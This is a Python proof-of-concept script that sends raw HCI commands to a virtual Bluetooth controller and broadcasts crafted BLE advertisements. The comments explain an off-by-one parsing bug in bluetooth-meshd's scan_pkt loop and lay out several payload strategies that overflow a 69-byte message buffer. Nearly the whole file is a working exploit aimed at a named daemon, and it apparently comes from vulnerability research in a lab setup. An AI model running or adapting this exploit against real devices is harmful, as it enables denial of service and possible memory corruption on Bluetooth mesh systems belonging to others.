"""
Send malicious BLE advertisement directly to Pi1's btvirt TCP port.
This bypasses the need for a second btproxy connection.

Usage: python3 send_hci_beacon.py
"""

import socket
import struct
import time

HCI_COMMAND_PKT = 0x01

def hci_cmd(ogf, ocf, data):
    """Build an HCI command packet for raw HCI transport."""
    opcode = (ocf & 0x03FF) | ((ogf & 0x3F) << 10)
    return struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(data)) + data

def main():
    host = '192.168.31.25'  # Pi1 IP
    port = 45550
    
    print(f"Connecting to {host}:{port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.settimeout(5)
    print("Connected!")
    
    # 1. Reset the controller first (to get it into a clean state)
    # OGF=0x03 (Controller & Baseband), OCF=0x0003 (Reset)
    reset = hci_cmd(0x03, 0x0003, b'')
    sock.send(reset)
    time.sleep(0.5)
    print("Reset sent")
    
    # 2. LE Set Advertising Parameters
    # OGF=0x08 (LE Controller), OCF=0x0006 (LE Set Advertising Parameters)
    # Format: interval_min(2), interval_max(2), adv_type(1), own_addr_type(1),
    #         peer_addr_type(1), peer_addr(6), channel_map(1), filter_policy(1)
    # Total: 15 bytes of parameters
    adv_params = (
        struct.pack('<HH', 0x0800, 0x0800) +  # min/max interval
        bytes([0x00]) +  # adv_type: ADV_NONCONN_IND
        bytes([0x00]) +  # own_addr_type: public
        bytes([0x00]) +  # peer_addr_type
        b'\x00\x00\x00\x00\x00\x00' +  # peer_addr (6 bytes, any)
        bytes([0x07]) +  # channel_map
        bytes([0x00])    # filter_policy
    )
    cmd = hci_cmd(0x08, 0x0006, adv_params)
    sock.send(cmd)
    time.sleep(0.3)
    print("Advertising parameters set")
    
    # 3. LE Set Advertising Data
    # OGF=0x08, OCF=0x0008 (LE Set Advertising Data)
    # 
    # Craft malicious AD data that exploits the scan_pkt bug
    # AD structure: [len][type][data...]
    # For Mesh Beacon: type=0x2B, data=[UUID 16B, OOB 2B]
    # For extended scan: we inject AD types that cause scan->list misalignment
    
    # Create multiple AD entries where the bug causes data byte = 0xFE to be read as length
    # AD1: Mesh Beacon (type 0x2B)
    uuid = bytes.fromhex("AABBCCDDEEFF00112233445566778899")
    beacon = b'\x00' + uuid + b'\x00\x00'
    
    # AD2: malicious Mesh Message with crafted payload
    # The key: after the bug (i += list[i] instead of i += list[i]+1),
    # the byte at position (len + data_start - 1) will be read as "next length"
    # We put 0xFE there
    
    # Strategy 1: Single AD with type 0x29, payload = [0x29, 0xFF, 0xFE]
    # scan->list: [3][0x29][0x29][0xFF][0xFE][0]
    # i=0, list[0]=3 -> copy 3 bytes, i+=3 => i=3
    # i=3, list[3]=0xFF -> copy 255 bytes to msg[69] -> OVERFLOW!
    evil1 = bytes([5, 0x29]) + bytes([0x29, 0x42, 0xFF, 0xFE])
    
    # Strategy 2: Two AD entries, bug misaligns to large value
    # AD1: len=3, type=0x2B, data=[0x01,0x02,0x03]
    # AD2: len=4, type=0x2B, data=[0x04,0x05,0x06,0x07]  
    # scan->list: [3][0x2B][0x01][0x02][0x03][0][4][0x2B][0x04][0x05][0x06][0x07][0]
    # After first AD: i=0, list[0]=3 -> i+=3 => i=3
    # i=3, list[3]=0x03 -> would continue, but 0x03 is small so maybe no crash
    # We need list[i] to be > 69 (msg buffer size)
    
    # Strategy 3: Direct large value
    # Create ADs where scan->list directly gets 0xFE from a data byte
    # The extended scan stores: list[i] = len; list[i+1..i+len] = data; list[i+len+1] = 0
    # 
    # For bug to work: we need list[i] = small, list[i + small] = 0xFE
    # If we send AD with data that starts with certain patterns...
    #
    # Actually the simplest way: we know that scan_pkt checks if broadcast is a mesh beacon
    # (data[0] == BT_AD_MESH_BEACON = 0x2B). Non-mesh beacons go to the else branch.
    # In the else branch at line 386, it writes to scan->list and checks if visited.
    # 
    # The bug is at line 424: i += scan->list[i] (wrong)
    # But the writing at line 400-402 uses the correct encoding:
    #   scan->list[i] = len;  <- correct length
    #   scan->list[i + len + 1] = 0; <- zero terminator at correct position
    #   memcpy(scan->list + i + 1, data, len); <- correct data
    #
    # So scan->list stores: [len][type][payload...][0][len][type][payload...]
    # The read-back loop at line 420:
    #   msg[n++] = scan->list[i];        -> stores length byte
    #   memcpy(&msg[n], scan->list+i+1, scan->list[i]); -> copies payload
    #   n += scan->list[i];              -> advance output
    #   i += scan->list[i];              -> BUG: advance input by length only, missing +1 for length byte!
    #
    # Due to bug: after processing entry with len=L, i points to scan->list[i+L]
    # Instead of scan->list[i+L+1]. So the next iteration reads scan->list[i+L]
    # which is the LAST DATA BYTE of the previous entry (not the next length byte).
    # 
    # To trigger: we need that last data byte to be large (e.g. 0xFE).
    # Then memcpy will copy 0xFE bytes into msg[69] buffer -> crash!
    
    # Simple trigger: single AD with type=0x29, 4 bytes payload
    # scan->list: [4][0x29][D0][D1][D2][D3][0]
    # i=0, list[0]=4 -> i+=4 => i=4
    # i=4, list[4] = D3 (last data byte of payload)
    # If D3 = 0xFF -> memcpy copies 255 bytes to msg[69] -> OVERFLOW!
    
    # Send multiple variations to increase chances
    payloads = [
        bytes([0x29, 0x00, 0x00, 0xFF]),  # D3=0xFF
        bytes([0x29, 0x00, 0x00, 0xFE]),  # D3=0xFE
        bytes([0x29, 0x00, 0xFF, 0x00]),  # D3=0x00 (D2=0xFF for len=5 case)
        bytes([0x29, 0x42, 0xFF, 0x00]),  # D2=0xFF
    ]
    
    for i, pld in enumerate(payloads):
        # AD = [len][type][payload...]
        ad = bytes([len(pld) + 1, 0x29]) + pld
        # Pad to 31 bytes max (BLE advertising data limit)
        # The actual data we send is just the AD (no extra padding needed)
        
        cmd_data = bytes([len(ad)]) + ad
        cmd = hci_cmd(0x08, 0x0008, cmd_data)
        
        print(f"Sending malicious AD #{i+1}: {ad.hex()}")
        sock.send(cmd)
        time.sleep(0.3)
        
        # Enable advertising for a short burst
        cmd_enable = hci_cmd(0x08, 0x000a, b'\x01')
        sock.send(cmd_enable)
        time.sleep(0.1)
        cmd_disable = hci_cmd(0x08, 0x000a, b'\x00')
        sock.send(cmd_disable)
        time.sleep(1.0)
    
    # Also send a normal Mesh Beacon (type 0x2B)
    beacon_ad = bytes([len(beacon) + 1, 0x2B]) + beacon
    cmd_data = bytes([len(beacon_ad)]) + beacon_ad
    cmd = hci_cmd(0x08, 0x0008, cmd_data)
    sock.send(cmd)
    time.sleep(0.3)
    
    # Flash advertising
    for i in range(10):
        cmd_enable = hci_cmd(0x08, 0x000a, b'\x01')
        sock.send(cmd_enable)
        time.sleep(0.05)
        cmd_disable = hci_cmd(0x08, 0x000a, b'\x00')
        sock.send(cmd_disable)
        time.sleep(0.2)
    
    print("\nDone! Check if bluetooth-meshd crashed.")
    sock.close()

if __name__ == '__main__':
    main()
